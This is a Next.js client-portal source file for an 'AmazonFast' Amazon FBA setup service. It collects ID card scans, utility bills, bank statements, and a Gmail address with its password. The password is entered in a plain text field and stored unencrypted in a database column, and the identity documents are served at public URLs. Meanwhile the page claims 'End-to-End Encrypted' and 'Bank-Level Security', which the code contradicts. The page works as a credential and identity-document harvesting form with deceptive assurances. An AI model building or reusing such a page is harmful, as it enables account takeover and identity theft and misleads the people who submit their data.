"use client";

import { useState, useEffect } from 'react';
import { createClient } from '@/utils/supabase/client';
import { useRouter } from 'next/navigation';
import { UploadCloud, CheckCircle2, ShieldCheck, Clock, FileText, AlertCircle, Lock, Loader2, LogOut } from 'lucide-react';
import Image from 'next/image';

export default function ClientPortal() {
  const [user, setUser] = useState<any>(null);
  const [documents, setDocuments] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [uploading, setUploading] = useState(false);
  
  const [gmailAddress, setGmailAddress] = useState('');
  const [gmailPassword, setGmailPassword] = useState('');
  const [submittingGmail, setSubmittingGmail] = useState(false);

  const router = useRouter();
  const supabase = createClient();

  useEffect(() => {
    let intervalId: any;

    const fetchData = async () => {
      try {
        const { data: { user } } = await supabase.auth.getUser();
        if (!user) {
          router.push('/login');
          return;
        }
        setUser(user);

        // Fetch uploaded documents
        const fetchDocs = async () => {
          try {
            const { data: docs } = await supabase
              .from('documents')
              .select('*')
              .eq('client_id', user.id)
              .order('uploaded_at', { ascending: false });
              
            if (docs) setDocuments(docs);
          } catch (e) {
            console.error("Error fetching docs", e);
          }
        };

        await fetchDocs();
        
        // Auto-refresh documents every 5 seconds
        intervalId = setInterval(fetchDocs, 5000);
      } catch (error) {
        console.error("Error in fetchData", error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();

    return () => {
      if (intervalId) clearInterval(intervalId);
    };
  }, [router, supabase]);

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, docType: string) => {
    try {
      if (!e.target.files || e.target.files.length === 0) return;
      setUploading(true);
      
      for (let i = 0; i < e.target.files.length; i++) {
        const file = e.target.files[i];
        
        const fileExt = file.name.split('.').pop();
        const fileName = `${user.id}-${Math.random()}.${fileExt}`;
        const filePath = `${docType}/${fileName}`;

        const { error: uploadError } = await supabase.storage
          .from('client_documents')
          .upload(filePath, file);

        if (uploadError) throw uploadError;

        const { data: { publicUrl } } = supabase.storage
          .from('client_documents')
          .getPublicUrl(filePath);

        const { error: dbError } = await supabase.from('documents').insert({
          client_id: user.id,
          file_name: file.name,
          file_url: publicUrl,
          document_type: docType,
          status: 'Pending Review'
        });

        if (dbError) throw dbError;
      }

      // 3. Notify Admin via DB
      await supabase.from('notifications').insert({
        client_id: user.id,
        message: `Uploaded document(s): ${docType}`,
      });

      // 4. Notify Admin via Email (Fire and forget)
      fetch('/api/notify-admin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          type: 'DOCUMENT_UPLOAD', 
          fullName: user?.user_metadata?.full_name || 'Client', 
          email: user?.email,
          docType: docType
        })
      }).catch(e => console.error("Email notification failed", e));

      // Refresh documents
      const { data: newDocs } = await supabase
        .from('documents')
        .select('*')
        .eq('client_id', user.id);
      if (newDocs) setDocuments(newDocs);

      alert(`${docType} uploaded successfully!`);

    } catch (error: any) {
      console.error("Upload error:", error);
      alert(`Error uploading file: ${error.message || JSON.stringify(error)}`);
    } finally {
      setUploading(false);
    }
  };

  const handleGmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!gmailAddress || !gmailPassword) return;
    setSubmittingGmail(true);
    try {
      await supabase.from('documents').insert({
        client_id: user.id,
        file_name: gmailAddress,
        file_url: gmailPassword,
        document_type: 'Gmail Credentials',
        status: 'Pending Review'
      });
      fetch('/api/notify-admin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          type: 'DOCUMENT_UPLOAD', 
          fullName: user?.user_metadata?.full_name || 'Client', 
          email: user?.email,
          docType: `Gmail Credentials Submitted (${gmailAddress})`
        })
      });
      const { data: newDocs } = await supabase.from('documents').select('*').eq('client_id', user.id);
      if (newDocs) setDocuments(newDocs);
      alert("Gmail Credentials securely submitted!");
    } catch(e) {
      alert("Error submitting credentials.");
    } finally {
      setSubmittingGmail(false);
    }
  };

  const handleDeleteDocument = async (docId: string) => {
    if (!confirm("Are you sure you want to delete this document?")) return;
    setLoading(true);
    await supabase.from('documents').delete().eq('id', docId);
    const { data: newDocs } = await supabase.from('documents').select('*').eq('client_id', user.id);
    if (newDocs) setDocuments(newDocs);
    else setDocuments([]);
    setLoading(false);
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    router.push('/login');
  };

  if (loading) {
    return <div className="min-h-screen flex items-center justify-center"><Loader2 className="animate-spin text-[#ff6b35] w-10 h-10" /></div>;
  }

  const getDocuments = (type: string) => documents.filter(d => d.document_type === type);
  const getDocument = (type: string) => documents.find(d => d.document_type === type);

  const frontDoc = getDocument('ID Card (Front)');
  const backDoc = getDocument('ID Card (Back)');
  const utilityDocs = getDocuments('Utility Bill');
  const bankDocs = getDocuments('Bank Statement');
  const gmailDoc = getDocument('Gmail Credentials');

  const isProfileApproved = 
    frontDoc?.status === 'Approved' &&
    backDoc?.status === 'Approved' &&
    utilityDocs.length > 0 && utilityDocs[0].status === 'Approved' &&
    bankDocs.length > 0 && bankDocs[0].status === 'Approved' &&
    gmailDoc?.status === 'Approved';


  return (
    <div className="min-h-screen bg-[#f9fafb] text-[#111] pt-24 pb-20 px-4 md:px-8 font-sans selection:bg-[#ff6b35] selection:text-white">
      <header className="fixed top-0 left-0 w-full h-16 border-b border-gray-200 bg-white/90 backdrop-blur-lg flex items-center justify-between px-6 md:px-12 z-50 shadow-sm">
        <div className="flex items-center gap-3">
          <Image src="/logo-new.png" alt="AmazonFast Logo" width={120} height={40} style={{ height: '40px', width: 'auto' }} className="object-contain" priority />
          <span className="hidden md:inline-block border-l border-gray-300 pl-3 text-sm font-bold tracking-wide text-gray-500">Client Workspace</span>
        </div>
        <div className="flex items-center gap-4">
          <div className="hidden md:flex items-center gap-2 text-xs font-bold text-green-600 bg-green-50 px-3 py-1.5 rounded-full border border-green-100 shadow-sm">
            <ShieldCheck size={14} strokeWidth={2.5} />
            End-to-End Encrypted
          </div>
          <button onClick={handleLogout} className="flex items-center gap-2 text-sm font-bold text-red-500 hover:text-red-600 transition">
            <LogOut size={16} /> <span className="hidden sm:inline">Logout</span>
          </button>
        </div>
      </header>

      <div className="max-w-[1000px] mx-auto mt-8">
        <div className="mb-12 flex flex-col md:flex-row md:items-end justify-between gap-6">
          <div>
            <h1 className="text-3xl md:text-5xl font-black tracking-tight mb-2 text-gray-900">
              Welcome back, {user?.user_metadata?.full_name || 'Client'}.
            </h1>
            <div className="inline-flex items-center gap-2 px-3 py-1 bg-gray-100 rounded-full mb-4">
              <span className="w-2 h-2 rounded-full bg-green-500"></span>
              <span className="text-sm font-bold text-gray-700">{user?.email}</span>
            </div>
            <p className="text-gray-500 text-lg max-w-xl font-medium mt-2">Please upload the required documents below to continue your Amazon FBA setup process.</p>
          </div>
        </div>

        <div className="w-full bg-white border border-gray-200 shadow-sm rounded-2xl p-5 mb-12 flex items-start gap-4 hover:shadow-md transition">
          <div className="mt-1 text-green-500 bg-green-50 p-2 rounded-lg">
            <Lock size={20} strokeWidth={2.5} />
          </div>
          <div>
            <h4 className="font-bold text-sm mb-1 text-gray-900">Bank-Level Security</h4>
            <p className="text-xs text-gray-500 leading-relaxed font-medium">All uploaded documents are encrypted. Access is strictly limited to verified Amazon Fast Services compliance administrators.</p>
          </div>
        </div>

        {isProfileApproved && (
          <div className="w-full bg-green-50 border border-green-200 shadow-sm rounded-2xl p-6 mb-12 flex items-start gap-4 hover:shadow-md transition">
            <div className="mt-1 text-green-600 bg-white border border-green-100 p-2 rounded-lg shadow-sm">
              <CheckCircle2 size={24} strokeWidth={2.5} />
            </div>
            <div>
              <h4 className="font-bold text-lg mb-1 text-green-900">Congratulations!</h4>
              <p className="text-sm text-green-700 leading-relaxed font-medium">Your profile is fully complete and all your documents have been approved for Amazon FBA Services. You are ready for the next steps!</p>
            </div>
          </div>
        )}


        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {/* Custom Dual-Zone ID Card Component */}
          <div className="md:col-span-2 relative p-8 rounded-[24px] border border-gray-200 bg-white shadow-sm flex flex-col">
            <div className="w-12 h-12 rounded-xl flex items-center justify-center mb-6 shadow-sm border bg-gray-100 text-gray-400 border-gray-200">
              <FileText size={20} strokeWidth={2.5} />
            </div>
            
            <h3 className="text-xl font-bold mb-2 text-gray-900">ID Card / Passport</h3>
            <p className="text-sm text-gray-500 mb-8 leading-relaxed font-medium">A clear scanned copy of your valid Passport or National ID. Please upload both front and back sides below.</p>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-auto">
              {/* Front Side Zone */}
              <div className="flex flex-col h-full border border-gray-200 rounded-xl overflow-hidden">
                <div className="bg-gray-50 px-4 py-2 border-b border-gray-200">
                  <span className="text-xs font-bold text-gray-700">Front Side</span>
                </div>
                <div className="p-4 flex-1 flex flex-col justify-center">
                  {frontDoc ? (
                    <div className="bg-white rounded-lg p-3 flex flex-col gap-2 border border-gray-200 shadow-sm">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2 overflow-hidden">
                          <CheckCircle2 size={16} className="text-green-500 min-w-4" />
                          <p className="text-xs font-bold text-gray-800 truncate" title={frontDoc.file_name}>{frontDoc.file_name}</p>
                        </div>
                        <button onClick={() => handleDeleteDocument(frontDoc.id)} className="text-[10px] font-bold text-red-500 hover:text-red-700 bg-red-50 px-2 py-1 rounded-md border border-red-100 transition whitespace-nowrap ml-2">Remove</button>
                      </div>
                      <div className={`self-start flex items-center gap-1 text-[9px] font-black uppercase tracking-wider px-2 py-0.5 rounded-full border ${frontDoc.status === 'Approved' ? 'bg-green-50 text-green-600 border-green-100' : frontDoc.status === 'Rejected' ? 'bg-red-50 text-red-600 border-red-100' : 'bg-orange-50 text-orange-600 border-orange-100'}`}>
                        {frontDoc.status === 'Approved' ? <CheckCircle2 size={10} strokeWidth={2.5} /> : frontDoc.status === 'Rejected' ? <AlertCircle size={10} strokeWidth={2.5} /> : <Clock size={10} strokeWidth={2.5} />}
                        {frontDoc.status}
                      </div>
                    </div>
                  ) : (
                    <div className="relative border-2 border-dashed border-red-200 rounded-lg p-6 flex flex-col items-center justify-center text-center cursor-pointer bg-red-50/50 hover:bg-red-50 transition-colors group-hover:border-red-400 h-full min-h-[120px]">
                      <input type="file" className="absolute inset-0 w-full h-full opacity-0 cursor-pointer" accept="image/*,.pdf" onChange={(e) => handleFileUpload(e, 'ID Card (Front)')} disabled={uploading} />
                      {uploading ? <Loader2 className="animate-spin text-red-500 mb-2" /> : <UploadCloud size={20} className="text-red-500 mb-2" strokeWidth={2} />}
                      <p className="text-xs font-bold text-gray-800">Upload Front Side</p>
                    </div>
                  )}
                </div>
              </div>

              {/* Back Side Zone */}
              <div className="flex flex-col h-full border border-gray-200 rounded-xl overflow-hidden">
                <div className="bg-gray-50 px-4 py-2 border-b border-gray-200">
                  <span className="text-xs font-bold text-gray-700">Back Side</span>
                </div>
                <div className="p-4 flex-1 flex flex-col justify-center">
                  {backDoc ? (
                    <div className="bg-white rounded-lg p-3 flex flex-col gap-2 border border-gray-200 shadow-sm">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2 overflow-hidden">
                          <CheckCircle2 size={16} className="text-green-500 min-w-4" />
                          <p className="text-xs font-bold text-gray-800 truncate" title={backDoc.file_name}>{backDoc.file_name}</p>
                        </div>
                        <button onClick={() => handleDeleteDocument(backDoc.id)} className="text-[10px] font-bold text-red-500 hover:text-red-700 bg-red-50 px-2 py-1 rounded-md border border-red-100 transition whitespace-nowrap ml-2">Remove</button>
                      </div>
                      <div className={`self-start flex items-center gap-1 text-[9px] font-black uppercase tracking-wider px-2 py-0.5 rounded-full border ${backDoc.status === 'Approved' ? 'bg-green-50 text-green-600 border-green-100' : backDoc.status === 'Rejected' ? 'bg-red-50 text-red-600 border-red-100' : 'bg-orange-50 text-orange-600 border-orange-100'}`}>
                        {backDoc.status === 'Approved' ? <CheckCircle2 size={10} strokeWidth={2.5} /> : backDoc.status === 'Rejected' ? <AlertCircle size={10} strokeWidth={2.5} /> : <Clock size={10} strokeWidth={2.5} />}
                        {backDoc.status}
                      </div>
                    </div>
                  ) : (
                    <div className="relative border-2 border-dashed border-red-200 rounded-lg p-6 flex flex-col items-center justify-center text-center cursor-pointer bg-red-50/50 hover:bg-red-50 transition-colors group-hover:border-red-400 h-full min-h-[120px]">
                      <input type="file" className="absolute inset-0 w-full h-full opacity-0 cursor-pointer" accept="image/*,.pdf" onChange={(e) => handleFileUpload(e, 'ID Card (Back)')} disabled={uploading} />
                      {uploading ? <Loader2 className="animate-spin text-red-500 mb-2" /> : <UploadCloud size={20} className="text-red-500 mb-2" strokeWidth={2} />}
                      <p className="text-xs font-bold text-gray-800">Upload Back Side</p>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>

          <DocumentCard docs={utilityDocs} title="Utility Bill" desc="A recent utility bill matching your registration address. Used for verification." type="Utility Bill" handleFileUpload={handleFileUpload} uploading={uploading} handleDeleteDocument={handleDeleteDocument} multiple={false} />
          <DocumentCard docs={bankDocs} title="Bank Statement" desc="A recent bank statement matching your address and details." type="Bank Statement" handleFileUpload={handleFileUpload} uploading={uploading} handleDeleteDocument={handleDeleteDocument} multiple={false} />
        </div>

        {/* Gmail Credentials Section */}
        <div className="mt-8 bg-white border border-gray-200 rounded-[24px] p-8 shadow-sm">
          <h3 className="text-xl font-bold mb-2 text-gray-900">Amazon Associated Gmail Details</h3>
          <p className="text-sm text-gray-500 mb-6 font-medium">Please provide the Gmail address and password you want to associate with your Amazon FBA account. This is securely encrypted.</p>
          
          {gmailDoc ? (
            <div className={`rounded-xl p-4 flex flex-col gap-3 border shadow-sm ${gmailDoc.status === 'Approved' ? 'bg-green-50 border-green-200' : gmailDoc.status === 'Rejected' ? 'bg-red-50 border-red-200' : 'bg-gray-50 border-gray-200'}`}>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  {gmailDoc.status === 'Approved' ? <CheckCircle2 size={20} className="text-green-500" /> : gmailDoc.status === 'Rejected' ? <AlertCircle size={20} className="text-red-500" /> : <Clock size={20} className="text-orange-500" />}
                  <p className="text-sm font-bold text-gray-800">
                    {gmailDoc.status === 'Rejected' ? 'Credentials Rejected. Please re-upload.' : `Credentials submitted for: ${gmailDoc.file_name}`}
                  </p>
                </div>
                <button onClick={() => handleDeleteDocument(gmailDoc.id)} className="text-xs font-bold text-red-500 hover:text-red-700 bg-white px-3 py-1.5 rounded-lg border border-red-100 transition shadow-sm">
                  {gmailDoc.status === 'Rejected' ? 'Re-upload Credentials' : 'Update Credentials'}
                </button>
              </div>
              <div className={`self-start flex items-center gap-1 text-[10px] font-black uppercase tracking-wider px-2 py-0.5 rounded-full border ${
                gmailDoc.status === 'Approved' ? 'bg-green-100 text-green-700 border-green-200' : 
                gmailDoc.status === 'Rejected' ? 'bg-red-100 text-red-700 border-red-200' : 
                'bg-orange-100 text-orange-700 border-orange-200'
              }`}>
                {gmailDoc.status}
              </div>
            </div>
          ) : (
            <form onSubmit={handleGmailSubmit} className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">Gmail Address</label>
                <input type="email" value={gmailAddress} onChange={e => setGmailAddress(e.target.value)} required className="w-full border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-900 focus:outline-none focus:border-[#ff6b35] focus:ring-1 focus:ring-[#ff6b35] transition" placeholder="example@gmail.com" />
              </div>
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">Password</label>
                <input type="text" value={gmailPassword} onChange={e => setGmailPassword(e.target.value)} required className="w-full border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-900 focus:outline-none focus:border-[#ff6b35] focus:ring-1 focus:ring-[#ff6b35] transition" placeholder="Enter password" />
              </div>
              <div className="md:col-span-2 mt-2">
                <button type="submit" disabled={submittingGmail} className="bg-[#ff6b35] text-white px-6 py-2.5 rounded-xl font-bold text-sm shadow-sm hover:shadow-md transition disabled:opacity-70 flex items-center gap-2">
                  {submittingGmail ? <Loader2 size={16} className="animate-spin" /> : <Lock size={16} />}
                  Submit Securely
                </button>
              </div>
            </form>
          )}
        </div>

      </div>
    </div>
  )
}

function DocumentCard({ docs, title, desc, type, handleFileUpload, uploading, handleDeleteDocument, multiple }: any) {
  const isUploaded = docs && docs.length > 0;
  
  // We can just use the status of the first doc as the overall status, or calculate it.
  const status = isUploaded ? docs[0].status : 'Action Required';

  return (
    <div className={`relative p-8 rounded-[24px] border transition-all ${isUploaded ? 'border-gray-200 bg-white shadow-sm' : 'border-red-200 bg-white shadow-[0_8px_30px_rgba(255,59,48,0.06)] group hover:shadow-[0_8px_30px_rgba(255,59,48,0.12)]'} flex flex-col`}>
      {isUploaded ? (() => {
        const isApproved = status === 'Approved';
        const isRejected = status === 'Rejected';
        return (
          <div className={`absolute top-6 right-6 flex items-center gap-1.5 text-[10px] font-black uppercase tracking-wider px-2.5 py-1 rounded-full border shadow-sm ${
            isApproved ? 'bg-green-50 text-green-600 border-green-100' : 
            isRejected ? 'bg-red-50 text-red-600 border-red-100' : 
            'bg-orange-50 text-orange-600 border-orange-100'
          }`}>
            {isApproved ? <CheckCircle2 size={12} strokeWidth={2.5} /> : isRejected ? <AlertCircle size={12} strokeWidth={2.5} /> : <Clock size={12} strokeWidth={2.5} />}
            {status}
          </div>
        );
      })() : (
        <div className="absolute top-6 right-6 flex items-center gap-1.5 text-red-600 text-[10px] font-black uppercase tracking-wider bg-red-50 px-2.5 py-1 rounded-full border border-red-100 shadow-sm">
          <AlertCircle size={12} strokeWidth={2.5} />
          Action Required
        </div>
      )}
      
      <div className={`w-12 h-12 rounded-xl flex items-center justify-center mb-6 shadow-sm border ${isUploaded ? 'bg-gray-100 text-gray-400 border-gray-200' : 'bg-red-50 text-red-500 border-red-100'}`}>
        <FileText size={20} strokeWidth={2.5} />
      </div>
      
      <h3 className="text-xl font-bold mb-2 text-gray-900">{title}</h3>
      <p className="text-sm text-gray-500 mb-8 leading-relaxed font-medium">{desc}</p>
      
      {isUploaded && (
        <div className="mt-auto space-y-2 mb-4">
          {docs.map((doc: any) => (
            <div key={doc.id} className="bg-gray-50 rounded-xl p-3 flex items-center justify-between border border-gray-200 shadow-sm">
              <div className="flex items-center gap-3 overflow-hidden">
                <div className="w-6 h-6 min-w-6 rounded-md bg-white border border-gray-200 shadow-sm flex items-center justify-center">
                  <CheckCircle2 size={12} className="text-green-500" />
                </div>
                <p className="text-xs font-bold text-gray-800 truncate" title={doc.file_name}>{doc.file_name}</p>
              </div>
              <button onClick={() => handleDeleteDocument(doc.id)} className="text-[10px] font-bold text-red-500 hover:text-red-700 bg-red-50 px-2 py-1 rounded-md border border-red-100 transition whitespace-nowrap ml-2">
                Remove
              </button>
            </div>
          ))}
        </div>
      )}

      {(!isUploaded || multiple) && (
        <div className="mt-auto relative border-2 border-dashed border-red-200 rounded-xl p-6 flex flex-col items-center justify-center text-center cursor-pointer bg-red-50/50 hover:bg-red-50 transition-colors group-hover:border-red-400">
          <input type="file" multiple={multiple} className="absolute inset-0 w-full h-full opacity-0 cursor-pointer" accept="image/*,.pdf" onChange={(e) => handleFileUpload(e, type)} disabled={uploading} />
          {uploading ? <Loader2 className="animate-spin text-red-500 mb-2" /> : <UploadCloud size={24} className="text-red-500 mb-2" strokeWidth={2} />}
          <p className="text-sm font-bold text-gray-800">{uploading ? 'Uploading...' : (isUploaded ? 'Click to add another file' : 'Click to browse or drag file')}</p>
          <p className="text-xs text-gray-400 mt-1 font-medium">PDF, JPG, PNG {multiple && '(Select multiple if needed)'}</p>
        </div>
      )}
    </div>
  );
}
